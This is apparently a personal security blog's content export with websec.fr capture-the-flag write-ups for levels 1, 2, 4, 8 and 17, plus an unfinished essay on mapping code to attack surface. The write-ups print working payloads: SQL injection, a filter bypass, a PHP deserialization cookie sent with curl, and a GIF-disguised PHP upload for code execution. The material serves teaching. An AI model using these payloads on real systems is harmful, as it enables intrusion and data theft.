[{"content":"Welcome to the book reviews section! Here you\u0026rsquo;ll find my thoughts on books I\u0026rsquo;ve read, ranging from technical works to fiction.\n","permalink":"http://localhost:1313/book-reviews/tmp/","title":"Book Review"},{"content":"Websec.fr Level 1 level01 - 1 point - 2564 solves The source code for level1 is shown here. Only the PHP code is included because the vulnerability is only in the PHP code.\n\u0026lt;?php session_start (); ini_set(\u0026#39;display_errors\u0026#39;, \u0026#39;on\u0026#39;); ini_set(\u0026#39;error_reporting\u0026#39;, E_ALL); include \u0026#39;anti_csrf.php\u0026#39;; init_token (); class LevelOne { public function doQuery($injection) { $pdo = new SQLite3(\u0026#39;database.db\u0026#39;, SQLITE3_OPEN_READONLY); $query = \u0026#39;SELECT id,username FROM users WHERE id=\u0026#39; . $injection . \u0026#39; LIMIT 1\u0026#39;; $getUsers = $pdo-\u0026gt;query($query); $users = $getUsers-\u0026gt;fetchArray(SQLITE3_ASSOC); if ($users) { return $users; } return false; } } if (isset ($_POST[\u0026#39;submit\u0026#39;]) \u0026amp;\u0026amp; isset ($_POST[\u0026#39;user_id\u0026#39;])) { check_and_refresh_token(); $lo = new LevelOne (); $userDetails = $lo-\u0026gt;doQuery ($_POST[\u0026#39;user_id\u0026#39;]); } ?\u0026gt; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; ........ \u0026lt;/html\u0026gt; The problem here is this line $query = 'SELECT id,username FROM users WHERE id=' . $injection . ' LIMIT 1'; it\u0026rsquo;s a sqli .\nSo for any number between 1 and 3 we have a username, and our mission is to display a password who can be a flag.\nFor 1 :\nid -\u0026gt; 1 username -\u0026gt; levelone For 2 :\nid -\u0026gt; 2 username -\u0026gt; jvoisin For 3 :\nid -\u0026gt; 3 username -\u0026gt; ExampleUser The payload is : 1 UNION SELECT id, password FROM users\nFlag : WEBSEC{Simple_SQLite_Injection}\n","permalink":"http://localhost:1313/posts/websec-fr-level1/","title":"Websec.fr Level 01"},{"content":"The source code for level2 is here.\n\u0026lt;?php ini_set(\u0026#39;display_errors\u0026#39;, \u0026#39;on\u0026#39;); class LevelTwo { public function doQuery($injection) { $pdo = new SQLite3(\u0026#39;leveltwo.db\u0026#39;, SQLITE3_OPEN_READONLY); $searchWords = implode ([\u0026#39;union\u0026#39;, \u0026#39;order\u0026#39;, \u0026#39;select\u0026#39;, \u0026#39;from\u0026#39;, \u0026#39;group\u0026#39;, \u0026#39;by\u0026#39;], \u0026#39;|\u0026#39;); $injection = preg_replace (\u0026#39;/\u0026#39; . $searchWords . \u0026#39;/i\u0026#39;, \u0026#39;\u0026#39;, $injection); $query = \u0026#39;SELECT id,username FROM users WHERE id=\u0026#39; . $injection . \u0026#39; LIMIT 1\u0026#39;; $getUsers = $pdo-\u0026gt;query ($query); $users = $getUsers-\u0026gt;fetchArray (SQLITE3_ASSOC); if ($users) { return $users; } return false; } } if (isset ($_POST[\u0026#39;submit\u0026#39;]) \u0026amp;\u0026amp; isset ($_POST[\u0026#39;user_id\u0026#39;])) { $lt = new LevelTwo (); $userDetails = $lt-\u0026gt;doQuery ($_POST[\u0026#39;user_id\u0026#39;]); } ?\u0026gt; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; .... \u0026lt;/html\u0026gt; We can see that these two lines were problematic, all words in this dictionary are removed from the payload.\n$searchWords = implode ([\u0026#39;union\u0026#39;, \u0026#39;order\u0026#39;, \u0026#39;select\u0026#39;, \u0026#39;from\u0026#39;, \u0026#39;group\u0026#39;,\u0026#39;by\u0026#39;],\u0026#39;|\u0026#39;); $injection = preg_replace (\u0026#39;/\u0026#39; . $searchWords . \u0026#39;/i\u0026#39;, \u0026#39;\u0026#39;, $injection); When we used a payload of level1 it catch a error,\nWarning: SQLite3::query(): Unable to prepare statement: 1, near \u0026#34;id\u0026#34;: syntax error in /index.php on line 12 Fatal error: Call to a member function fetchArray() on boolean in /index.php on line 13 so we can used one trick. Payload :\n1 uniounionn selecselectt id, password frofromm users and it\u0026rsquo;s work!\nFlag: WEBSEC{BecauseBlacklistsAreOftenAgoodIdea}\n","permalink":"http://localhost:1313/posts/websec-fr-level2/","title":"Websec.fr Level 02"},{"content":"\nFor the Level Four challenge, there are two sources: here and here.\nOnly the PHP code is shown here because the HTML is not important.\nsource1.php\n\u0026lt;?php include \u0026#39;connect.php\u0026#39;; $sql = new SQL(); $sql-\u0026gt;connect(); $sql-\u0026gt;query = \u0026#39;SELECT username FROM users WHERE id=\u0026#39;; if (isset ($_COOKIE[\u0026#39;leet_hax0r\u0026#39;])) { $sess_data = unserialize (base64 _decode ($_COOKIE[\u0026#39;leet_hax0r\u0026#39;])); try { if (is_array($sess_data) \u0026amp;\u0026amp; $sess_data[\u0026#39;ip\u0026#39;] != $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]) { die(\u0026#39;CANT HACK US!!!\u0026#39;); } } catch(Exception $e) { echo $e; } } else { $cookie = base64_encode (serialize (array ( \u0026#39;ip\u0026#39; =\u0026gt; $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]))) ; setcookie (\u0026#39;leet_hax0r\u0026#39;, $cookie, time () + (86400 * 30)); } if (isset ($_REQUEST[\u0026#39;id\u0026#39;]) \u0026amp;\u0026amp; is_numeric ($_REQUEST[\u0026#39;id\u0026#39;])) { try { $sql-\u0026gt;query .= $_REQUEST[\u0026#39;id\u0026#39;]; } catch(Exception $e) { echo \u0026#39; Invalid query\u0026#39;; } } ?\u0026gt; source2.php\n\u0026lt;?php class SQL { public $query = \u0026#39;\u0026#39;; public $conn; public function __construct() { } public function connect() { $this-\u0026gt;conn = new SQLite3 (\u0026#34;database.db\u0026#34;, SQLITE3_OPEN_READONLY); } public function SQL_query($query) { $this-\u0026gt;query = $query; } public function execute() { return $this-\u0026gt;conn-\u0026gt;query ($this-\u0026gt;query); } public function __destruct() { if (!isset ($this-\u0026gt;conn)) { $this-\u0026gt;connect (); } $ret = $this-\u0026gt;execute (); if (false !== $ret) { while (false !== ($row = $ret-\u0026gt;fetchArray (SQLITE3_ASSOC))) { echo \u0026#39;\u0026lt;p class=\u0026#34;well\u0026#34;\u0026gt;\u0026lt;strong\u0026gt;Username:\u0026lt;strong\u0026gt; \u0026#39; . $row[\u0026#39;username\u0026#39;] . \u0026#39;\u0026lt;/p\u0026gt;\u0026#39;; } } } } ?\u0026gt; The source2.php helps to connect to the database (database.db) and contains all functions that execute and receive queries, and the source1.php file contains a part that receives user input and sends a request using a function in source2.php.\nThe function that takes our attention is the __destruct() function which is known to be a special magic function called when an object is destroyed.\nIt is also known to lead to insecure deserialization.\nSo first, it\u0026rsquo;s important to understand what the code is doing and how it works.\nIt checks if the input is an integer first and displays the username associated with this id When we connect to websec.fr a cookie is created, its name is leet_hax0r and your IP address is checked before allowing you to use the app. $ curl -c - http://websec.fr/level04/index.php ..... websec.fr\tFALSE\t/level04/\tFALSE\t1768011574\tleet_hax0r\tYToxOntzOjI6ImlwIjtzOjE1OiIxMzcuMjU1LjEyNy4xMjkiO30%3D the YToxOntzOjI6ImlwIjtzOjE1OiIxMzcuMjU1LjEyNy4xMjkiO30%3D is encoded to base64, after decoding we have\na:1:{s:2:\u0026#34;ip\u0026#34;;s:15:\u0026#34;137.255.127.129\u0026#34;;} this is the format of serialized data, let\u0026rsquo;s break down it.\nWe have an ip address in deserialized data and it checked here :\nif (isset ($_COOKIE[\u0026#39;leet_hax0r\u0026#39;])) { $sess_data = unserialize (base64_decode ($_COOKIE[\u0026#39;leet_hax0r\u0026#39;])); try { if (is_array($sess_data) \u0026amp;\u0026amp; $sess_data[\u0026#39;ip\u0026#39;] != $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]) { die(\u0026#39;CANT HACK US!!!\u0026#39;); } } catch(Exception $e) { echo $e; } so we can if we want bypass this check like this : Now about a term used in image :\nSQL Object was choosen because __destruct() method in SQL class use the variable $query to build the SQL query. By change this value in serialized data the Attacker can force the app to run a arbitrary SQL query . conn represent database connexion and N is her value because by setting it have a NULL value . I personnaly write a serialized data using the default serialized data given by app :\na:2:{s:2:\u0026quot;ip\u0026quot;;s:15:\u0026quot;137.255.127.129\u0026quot;;s:7:\u0026quot;exploit\u0026quot;;O:3:\u0026quot;SQL\u0026quot;:1:{s:5:\u0026quot;query\u0026quot;;s:39:\u0026quot;SELECT password AS username FROM users;\u0026quot;;s:4:\u0026quot;conn\u0026quot;;N;}}\nbut for bypass the check of ip address like show in previous image we can use this :\nO:3:\u0026quot;SQL\u0026quot;:1:{s:5:\u0026quot;query\u0026quot;;s:39:\u0026quot;SELECT password AS username FROM users;\u0026quot;;s:4:\u0026quot;conn\u0026quot;;N;}\nSo let\u0026rsquo;s go for exploitation:\ntedsig42@exegol:~# echo -n \u0026#39;a:2:{s:2:\u0026#34;ip\u0026#34;;s:15:\u0026#34;137.255.127.129\u0026#34;;s:7:\u0026#34;exploit\u0026#34;;O:3:\u0026#34;SQL\u0026#34;:1:{s:5:\u0026#34;query\u0026#34;;s:39:\u0026#34;SELECT password AS username FROM users;\u0026#34;;s:4:\u0026#34;conn\u0026#34;;N;}}\u0026#39; | base64 YToyOntzOjI6ImlwIjtzOjE1OiIxMzcuMjU1LjEyNy4xMjkiO3M6NzoiZXhwbG9pdCI7TzozOiJT UUwiOjE6e3M6NToicXVlcnkiO3M6Mzk6IlNFTEVDVCBwYXNzd29yZCBBUyB1c2VybmFtZSBGUk9N IHVzZXJzOyI7czo0OiJjb25uIjtOO319 tedsig42@exegol:~$ curl -k https://websec.fr/level04/index.php -H \u0026#34;Cookie: leet_hax0r=YToyOntzOjI6ImlwIjtzOjE1OiIxMzcuMjU1LjEyNy4xMjkiO3M6NzoiZXhwbG9pdCI7TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6Mzk6IlNFTEVDVCBwYXNzd29yZCBBUyB1c2VybmFtZSBGUk9NIHVzZXJzOyI7czo0OiJjb25uIjtOO319\u0026#34; \u0026lt;p class=\u0026#34;well\u0026#34;\u0026gt;\u0026lt;strong\u0026gt;Username:\u0026lt;strong\u0026gt; WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}\u0026lt;/p\u0026gt; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; ................. \u0026lt;/html\u0026gt; and we got the flag.\nFlag : WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}\nThe final image exploitation was here :\n","permalink":"http://localhost:1313/posts/websec-fr-level4/","title":"Websec.fr Level 04"},{"content":"The source code of level8 is here.\n\u0026lt;?php $uploadedFile = sprintf(\u0026#39;%1$s/%2$s\u0026#39;, \u0026#39;/uploads\u0026#39;, sha1($_FILES[\u0026#39;fileToUpload\u0026#39;][\u0026#39;name\u0026#39;]) . \u0026#39;.gif\u0026#39;); if (file_exists ($uploadedFile)) { unlink ($uploadedFile); } if ($_FILES[\u0026#39;fileToUpload\u0026#39;][\u0026#39;size\u0026#39;] \u0026lt;= 50000) { if (getimagesize ($_FILES[\u0026#39;fileToUpload\u0026#39;][\u0026#39;tmp_name\u0026#39;]) !== false) { if (exif_imagetype($_FILES[\u0026#39;fileToUpload\u0026#39;][\u0026#39;tmp_name\u0026#39;]) === IMAGETYPE_GIF) { move_uploaded_file ($_FILES[\u0026#39;fileToUpload\u0026#39;][\u0026#39;tmp_name\u0026#39;], $uploadedFile); echo \u0026#39;\u0026lt;p class=\u0026#34;lead\u0026#34;\u0026gt;Dump of \u0026lt;a href=\u0026#34;/level08\u0026#39; . $uploadedFile . \u0026#39;\u0026#34;\u0026gt;\u0026#39;. htmlentities($_FILES[\u0026#39;fileToUpload\u0026#39;][\u0026#39;name\u0026#39;]) . \u0026#39;\u0026lt;/a\u0026gt;:\u0026lt;/p\u0026gt;\u0026#39;; echo \u0026#39;\u0026lt;pre\u0026gt;\u0026#39;; include_once($uploadedFile); echo \u0026#39;\u0026lt;/pre\u0026gt;\u0026#39;; unlink($uploadedFile); } else { echo \u0026#39;\u0026lt;p class=\u0026#34;text-danger\u0026#34;\u0026gt;The file is not a GIF\u0026lt;/p\u0026gt;\u0026#39;; } } else { echo \u0026#39;\u0026lt;p class=\u0026#34;text-danger\u0026#34;\u0026gt;The file is not an image\u0026lt;/p\u0026gt;\u0026#39;; } } else { echo \u0026#39;\u0026lt;p class=\u0026#34;text-danger\u0026#34;\u0026gt;The file is too big\u0026lt;/p\u0026gt;\u0026#39;; } ?\u0026gt; With this code we have 2 problems to bypass:\nThe GIF header The size of the file uploaded For this type of vulnerability I use my mindmap So we can create a file containing this:\nGIF89a\u0026lt;?php var_dump(scandir(\u0026#39;./\u0026#39;)); ?\u0026gt;; Here, GIF89a is the header of a GIF file.\nDump of file.php: GIF89aarray(7) { [0]=\u0026gt; string(1) \u0026#34;.\u0026#34; [1]=\u0026gt; string(2) \u0026#34;..\u0026#34; [2]=\u0026gt; string(8) \u0026#34;flag.txt\u0026#34; [3]=\u0026gt; string(9) \u0026#34;index.php\u0026#34; [4]=\u0026gt; string(12) \u0026#34;php-fpm.sock\u0026#34; [5]=\u0026gt; string(10) \u0026#34;source.php\u0026#34; [6]=\u0026gt; string(7) \u0026#34;uploads\u0026#34; } ; After scanning the directory we can cat a flag.txt\nGIF89a\u0026lt;?php var_dump(file_get_contents(\u0026#39;./flag.txt\u0026#39;)); ?\u0026gt;; and we have this result:\nGIF89astring(35) \u0026#34; WEBSEC{BypassingImageChecksToRCE} \u0026#34; ; Flag : WEBSEC{BypassingImageChecksToRCE}\n","permalink":"http://localhost:1313/posts/websec-fr-level8/","title":"Websec.fr Level 08"},{"content":"\nThe code for level17 is here.\n\u0026lt;?php include \u0026#34;flag.php\u0026#34;; function sleep_rand() { /* I wish php5 had random_int() */ $range = 100000; $bytes = (int) (log($range, 2) / 8) + 1; do { /* Side effect: more random cpu cycles wasted ;) */ $rnd = hexdec(bin2hex(openssl_random_pseudo_bytes($bytes))); } while ($rnd \u0026gt;= $range); usleep($rnd); } ?\u0026gt; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; ....... \u0026lt;?php if (isset ($_POST[\u0026#39;flag\u0026#39;])): sleep_rand(); /* This makes timing-attack impractical. */ ?\u0026gt; \u0026lt;br\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;?php if (! strcasecmp ($_POST[\u0026#39;flag\u0026#39;], $flag)) echo \u0026#39;\u0026lt;div class=\u0026#34;alert alert-success\u0026#34;\u0026gt;Here is your flag: \u0026lt;mark\u0026gt;\u0026#39; . $flag . \u0026#39;\u0026lt;/mark\u0026gt;.\u0026lt;/div\u0026gt;\u0026#39;; else echo \u0026#39;\u0026lt;div class=\u0026#34;alert alert-danger\u0026#34;\u0026gt;Invalid flag, sorry.\u0026lt;/div\u0026gt;\u0026#39;; ?\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;?php endif ?\u0026gt; ........ \u0026lt;/html\u0026gt; After reading the code, we can ignore the first part of the PHP code because it\u0026rsquo;s impossible to break this function.\nBut in the second part, the only thing that can lead to a vulnerability is strcasecmp. This function checks if the input matches the flag.\nReading strcasecmp php documentation we can see that :\nReturns a value less than 0 if string1 is less than string2; a value greater than 0 if string1 is greater than string2, and 0 if they are equal. So this vulnerability looks like type juggling, we just have to make strcasecmp return 0 or true to exfiltrate the flag.\nAfter some research I read this article which explains exactly what I want, if we compare a string with another type of value like array strcasecmp returns 0.\nUsing DevTools in network section I sent a POST request and copy as Curl and modify it.\ntedsig42@exegol:~# curl \u0026#39;http://websec.fr/level17/index.php\u0026#39; -X POST --data-raw \u0026#39;flag[]=a\u0026amp;submit=Go\u0026#39; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; ................ \u0026lt;div class=\u0026#34;alert alert-success\u0026#34;\u0026gt;Here is your flag: \u0026lt;mark\u0026gt;WEBSEC{It_seems_that_php_could_use_a_stricter_typing_system}\u0026lt;/mark\u0026gt;.\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; ............... \u0026lt;/html\u0026gt; Flag : WEBSEC{It_seems_that_php_could_use_a_stricter_typing_system}\n","permalink":"http://localhost:1313/posts/websec-fr-level17/","title":"Websec.fr Level 17"},{"content":"\nMAPPING CODE TO ATTACK SURFACE Once we know where we are, then the world becomes as narrow as a map.\nWhen we don’t know, the world feels unlimited. Liu Cixin, The Dark Forest\nIntroduction Attack surface (the potential entry points to exploit a vulnerability) often increases with the growing complexity of software.\nThe vulnerabilities to be introduced, as developers’ capacity to properly secure these feature is limited and mistakes are inevitable when dealing with millions of lines of code.\nMinor issues can be chained together into far more serious vulnerabilities.\nFor example :\nMicrosoft Excel handles not only Excel workbook file format (.xls, .xlsx, .xlsm, .xls) but also Symbolic Link (.slk), dBase (.dbf), Data Interchange Format (.dif), and more. And these are just file input vectors; you also have to worry about inter-process communication and other network vectors (Inter-Process Communication or IPC is a mechanism that allows processes to communicate. It helps processes synchronize their activities, share information, and avoid conflicts while accessing shared resources.). For example, another process may control Excel via Component Object Model (COM) interfaces (These objects can be within a single process, in other processes, even on remote computers.), or it may fetch data from the internet via external data connections.\nThese are all potential sources for exploitable vulnerabilities . The Internet In the past, native and web applications lived in separate worlds:\nNative applications were compiled into machine code binaries that ran on specific devices and platforms. Web applications were mostly written in web development languages . They had vastly different attack surfaces and exploit vectors. Web Client Vulnerabilities Client-side vulnerabilities are especially for software running on native devices, such as desktop or mobile applications\nAttack Vectors The possible attack vectors vary depending on how the software parses the data.\nThe attack surface also depends on whether and to what extent an attacker controls the destination the software is connecting to.\nThese factors will affect the scope of your source code analysis and the types of potential vulnerabilities you should look out for.\nA man-in-the-middle (MITM) is often required for exploiting any vulnerability when software is running on a hardcoded URL This assumes some level of control over the network or device that the software is running on.\nExemple :\nNintendo Switch - WebKit Code Execution:\nCVE-2016-4657 web-kit vulnerability for ios 9.3, nintendo switch browser vulnerability ( i know whats running in your mind nintendo switch has no no browser, but when you need to use a wifi which needs to be conformed by logging in to the browser) a memory corruption in webkit .\nTo hijack this flow, an attacker could modify the Domain Name System (DNS) settings of the Switch (or the router it’s connected to), rerouting it to an attacker-controlled web server hosting a payload designed to exploit CVE-2016-4657. Sources : Saelo , Phrack - Attacking Javascript Engines , ExploitDB PoC, Liveoverflow\nReverse Engineering to Facebook Gameroom :\nThe Facebook Gameroom desktop application use the custom uniform resource identifier (URI) scheme fbgame://gameid/ it registered could be manipulated to cause the application to navigate to different pages on https://apps.facebook.com in its embedded Chromium-based browser.\nBy exploiting a few redirection gadgets on that domain, It was able to redirect back to the own attacker-controlled payload on a different domain that triggered a memory corruption vulnerability (CVE-2018-6056) on the outdated version off Chromium.\nThe combination of a local input vector (in this case, the custom URI scheme) and a web-based gadget chain (redirections in apps.facebook.com) is an increasingly common exploit pattern due to the growing prevalence of (often outdated) embedded browsers in desktop applications.\nSource: Spaceracoon facebook gameroom RE Identification and Classification You can identify and classify web client functionality in code by searching for web-related application programming interfaces (APIs) and library function calls in the source code.\nDevelopers often use libraries to simplify common tasks like making web requests and parsing their responses.\nFor example, in previous exemple (about Facebook Gameroom) the researcher (Eugene Lim) determined that Facebook Gameroom included an embedded browser because it imported CefSharp.dll, a .NET wrapper for the Chromium Embedded Framework.\nBy tracing the usage of CefSharp APIs in the decompiled C# code, he identified the most pertinent sections that make up the web client attack surface of the application.\n# example code to load and render a web page offscreen with CefSharp. using System; using CefSharp; using CefSharp.OffScreen; class Program { static void (string[] args) { const string testUrl = \u0026#34;https://www.google.com/\u0026#34;; Cef.Initialize(new CefSettings()); var browser = new ChromiumWebBrowser(); browser.Load(testUrl); // 1 Console.ReadKey(); Cef.Shutdown(); } } # A simple CefSharp offscreen client After any research we found that : ChromiumWebBrowser() refers to a class constructor used in CefSharp, an open-source framework that allows embedding a full-featured web browser into .NET applications (C# or VB.NET). This is API call (//1) is a possible attack vector via a attacker-controlled url. But it\u0026rsquo;s important to highlight an important point: When identifying the attack surface of software at the macro level, the distinction between sources and sinks becomes blurred.\nThe key idea is that some functions, while not directly receiving data from a user (a source), use that data to perform an action (a sink).\nSimple Example:\nImagine a program that takes a URL as input and displays the webpage.\nA user enters a URL like https://www.google.com/. The program uses a function like browser.Load(user_input_url) . An attacker could enter a malicious URL like https://malicious-site.com/ which could lead to a server-side request forgery (SSRF) vulnerability or other attacks, where the server is tricked into making a request it shouldn\u0026rsquo;t. The \u0026ldquo;blur\u0026rdquo; happens because a function can act as both.\nWeb Server Vulnerabilities Web server or client containing a lot of vulnerabilities, and all of devices when it use it also, like Iot devices.\n\u0026gt; Web Frameworks Web application framework (WAF) is a software framework that is designed to support the development of web applications including web services, web resources, and web APIs.\nMany web frameworks provide libraries for database access, templating frameworks, and session management, and they often promote code reuse.\nSource : Web Framework\nConsider this piece of code, which is a Node.js web server that exposes a few routes using the standard http library.\nhttpserver.js\nconst http = require(\u0026#39;http\u0026#39;); const server = http.createServer((req, res) =\u0026gt; { res.statusCode = 200; if (req.method === \u0026#39;GET\u0026#39;) { //1 if (req.url === \u0026#39;/\u0026#39;) { return res.end(\u0026#39;index\u0026#39;); } if (req.url === \u0026#39;/items\u0026#39;) { return res.end(\u0026#39;read all items\u0026#39;); } if (req.url.startsWith(\u0026#39;/items/\u0026#39;)) { //2 const id = req.url.split(\u0026#39;/\u0026#39;)[2]; return res.end(`read item ${id}`); } } else if (req.method === \u0026#39;POST\u0026#39;) { if (req.url === \u0026#39;/items\u0026#39;) { return res.end(\u0026#39;create an item\u0026#39;); } } res.statusCode = 404; return res.end(); }); server.listen(8080, () =\u0026gt; { console.log(\u0026#39;Server running at http://localhost:8080/\u0026#39;); }); A vanilla Node.js web server\nIt\u0026rsquo;s difficulties of maintaining the code of large web applications without a web framework Distinguishing between GET and POST routes relies on clumsy nested conditional statements (//1), while fragile string operations are used to extract path parameters like userId (//2). Now compare it to another Framework (Express)\nexpressserver.js\nconst express = require(\u0026#39;express\u0026#39;); const app = express(); const itemsRouter = express.Router(); itemsRouter.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { //1 res.send(\u0026#39;read all items\u0026#39;); }); itemsRouter.post(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { res.send(\u0026#39;create an item\u0026#39;); }); itemsRouter.get(\u0026#39;/:id\u0026#39;, (req, res) =\u0026gt; { const { id } = req.params; //2 res.send(`read item ${id}`); }); app.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { res.send(\u0026#39;index\u0026#39;); }); app.use(\u0026#39;/items\u0026#39;, itemsRouter); app.listen(8080, () =\u0026gt; { console.log(\u0026#39;Server running at http://localhost:8080/\u0026#39;); }); A web server built on the Express framework\nNot only does Express do the same thing with less code, it also abstracts away common tasks like checking the request method (//1), extracting path parameters (//2), and handling nonexistent routes.\nWeb frameworks create opportunities to refactor code, such as moving nested routes under /items to another file. This makes the code easier to read both for developers and for you, the aspiring vulnerability researcher.\n\u0026gt; The Model–View–Controller Architecture One common pattern among web frameworks is the Model–View–Controller (MVC) architecture, which separates the code into three main groups.\nFamiliarity with this pattern will help you quickly analyze frameworks, understand the flow of data through sources and sinks, and focus on the critical business logic that is most likely to contain vulnerabilities instead of getting caught up in irrelevant code.\nThe MVC architecture comprises three parts:\nModel Handles the \u0026ldquo;business logic\u0026rdquo;, such as data structures. View Handles the user interface, such as layouts and templates. Controller Handles the control flow from requests to relevant model and view components. Spring MVC (a Java web framework) in were we converted a previous node app.\nItemController.java\n@Controller @RequestMapping(\u0026#34;/items\u0026#34;) //1 public class ItemController { private final ItemService itemService; @Autowired public ItemController(ItemService itemService) { this.itemService = itemService; } @RequestMapping(method = RequestMethod.GET) public Map\u0026lt;String, Item\u0026gt; readAllItems() { return itemService.getAllItems(); } @RequestMapping(method = RequestMethod.POST) public String createItem(ItemForm item) { //2 itemService.createItem(item); return \u0026#34;redirect:/items\u0026#34;; } @RequestMapping(value = \u0026#34;/{id}\u0026#34;, method = RequestMethod.GET) public Map\u0026lt;String, Item\u0026gt; readItemForId( @PathVariable Int id, Model model) { return itemService.getItemById(id); } } A partial controller code snippet for Spring MVC\nWhen you read the code it difficult to understand her functions unless you’re familiar with the framework’s conventions.\nLike @Autowired for know her role it\u0026rsquo;s important to read the springs boot documentation, and after reading we read that it\u0026rsquo;s used to enables automatic dependency injection.\nThis annotation can be placed on a constructor, a method or directly on an attribute.\nThe Spring Framework will search for the bean in the application context whose type is applicable to each constructor parameter, method parameter or attribute.\nIn (//2), note the function createItem returns redirect:/items . The redirect: prefix indicates that the route should redirect to the URL that comes after it, which in this case is /items.\nBut any function or line are simple.\nBy exemple it’s still fairly obvious that the @RequestMapping annotation maps a handler method to a particular request route (GET, POST) . (//1)\nSpecially for object-oriented programming languages, you can encounter a controller who can inherits of methods and route of another controller (who often is declared in another file).\nThingController.java\n@Controller @RequestMapping(\u0026#34;/things\u0026#34;) public class ThingController extends ItemController { //1 @RequestMapping(value = \u0026#34;/price\u0026#34;, method = RequestMethod.GET) //2 public ModelAndView getPrice() { // Controller code } } An extended controller class /things/price route handler (//2), this controller inherits the previous routes and methods from ItemController\n\u0026gt; Unknown or Unfamiliar Frameworks To effectively analyze web server code regardless of the framework used, focus on common routing and controller logic that all web applications must implement.\nFirst, identify how the code handles the basic building blocks of an HTTP request. Here’s a simple example of what such a request might look like:\nPOST /items HTTP/1.1 Host: localhost Content-Type: application/json { \u0026#34;name\u0026#34;: \u0026#34;Apple\u0026#34;, \u0026#34;price\u0026#34;: 1 } The application needs to parse the following components:\nRequest method : GET or POST request ? Grepping for GET or POST might yield insights or a simple string comparison or more complex decorators like @GetMapping.\nURI : To locate routes quickly in a web application codebase, look for URI-like strings. If you have a working instance of the application, try matching the behavior you observe at a particular route with the code that handles that route .\nApplications often handle routes declaratively, such as app.get('/items') instead of if (req.url === '/items').\nUnderstanding the declarative convention is key. Some frameworks, like Ruby on Rails, even centralize the routing logic in specific files, such as config/routes.rb.\nHeaders : Does the application check specific headers? Search for common headers like Origin or Content-Type, Check all things about CORS and SOP .\nParameters : How does the code extract parameters from a request? Other than the request URI, this is one of the most common sources of external input. Parameters can come from the HTTP request body (like the JSON content in the example request), the query string, or within the path.\nNext, identify how the code handles sending HTTP responses.\nFor example, after creating the item specified in the example request and adding it to the database, the web application could send:\nHTTP/1.1 201 Created Content-Type: application/json Cache-Control: no-cache { \u0026#34;id\u0026#34;: 1337, \u0026#34;name\u0026#34;: \u0026#34;Apple\u0026#34;, \u0026#34;price\u0026#34;: 1 } Focus on the building blocks of the HTTP response and map each of them to the code that appears to handle them. With this approach, you can intuitively work out the patterns of any framework to sufficiently map out the web attack surface based on reachable routes. You can also save a lot of time and effort by reading the documentation, if any is available, of the particular framework the application uses.\n\u0026gt; Nontraditional Web Attack Surfaces HTTP endpoints is not the only attack surface that can be used in software application context.\nIt may use protocols or formats like Web Distributed Authoring and Versioning (WebDAV) or Really Simple Syndication (RSS) that build upon or extend HTTP or other web-related protocols, such as WebSocket, Web Real-Time Communication (WebRTC), and many more.\nThis means you should think beyond traditional web attack vectors.\nAdditionally, a web attack surface doesn’t mean you should look only for web vulnerabilities like SQL injection.\nFor example, at Pwn2Own Tokyo 2019, the security researcher known as \u0026ldquo;d4rkn3ss\u0026rdquo; exploited a classic heap overflow vulnerability in the httpd web service of the NETGEAR Nighthawk R6700v3 router\nDue to the limited compute and storage available on smart devices, it’s actually quite rare to find fully fledged web frameworks running on these devices.\nInstead, you’re more likely to find compiled binaries that include both the web server and application logic.\nThis increases the possibility of discovering classic non-web vulnerabilities like memory corruption even in the web components.\nIt also means that your approach toward analyzing the web attack surface of firmware will involve binary analysis techniques like reverse engineering rather than source code analysis.\nSome applications may spin up temporary web servers for inter-process communication. Software sometimes requires users to sign in via the browser as part of an OAuth flow. Exemple :\nThe GitHub command line interface (CLI) tool can trigger a web app OAuth login flow via the github.com/cli/oauth package, which starts a local HTTP server before opening a web browser to the initial OAuth web URL.\noauth_webapp.go\n// 2024 GitHub, Inc. package oauth import ( \u0026#34;context\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;github.com/cli/browser\u0026#34; \u0026#34;github.com/cli/oauth/api\u0026#34; \u0026#34;github.com/cli/oauth/webapp\u0026#34; ) // WebAppFlow starts a local HTTP server, opens the web browser to initiate the OAuth Web application // flow, blocks until the user completes authorization and is redirected back, and returns the access token. func (oa *Flow) WebAppFlow() (*api.AccessToken, error) { host := oa.Host if host == nil { parsedHost, err := NewGitHubHost(\u0026#34;https://\u0026#34; + oa.Hostname) if err != nil { return nil, fmt.Errorf(\u0026#34;error parsing the hostname \u0026#39;%s\u0026#39;: %w\u0026#34;, oa.Hostname, err) } host = parsedHost } flow, err := webapp.InitFlow() if err != nil { return nil, err } params := webapp.BrowserParams{ ClientID: oa.ClientID, RedirectURI: oa.CallbackURI, //1 Scopes: oa.Scopes, Audience: oa.Audience, AllowSignup: true, } browserURL, err := flow.BrowserURL(host.AuthorizeURL, params) if err != nil { return nil, err } go func() { _ = flow.StartServer(oa.WriteSuccessHTML) }() browseURL := oa.BrowseURL if browseURL == nil { browseURL = browser.OpenURL } err = browseURL(browserURL) if err != nil { return nil, fmt.Errorf(\u0026#34;error opening the web browser: %w\u0026#34;, err) } httpClient := oa.HTTPClient if httpClient == nil { httpClient = http.DefaultClient } return flow.Wait(context.TODO(), httpClient, host.TokenURL, webapp.WaitOptions{ //2 ClientSecret: oa.ClientSecret, }) } After the user has successfully authenticated in the browser, the flow redirects to the callback URL (//1) at the local HTTP server with the temporary authorization code and state. The program then uses an HTTP client (//2) to make a POST request to the GitHub OAuth service’s token endpoint and exchanges the authorization code for an access token.\nIn summary, the web attack surface covers a large variety of 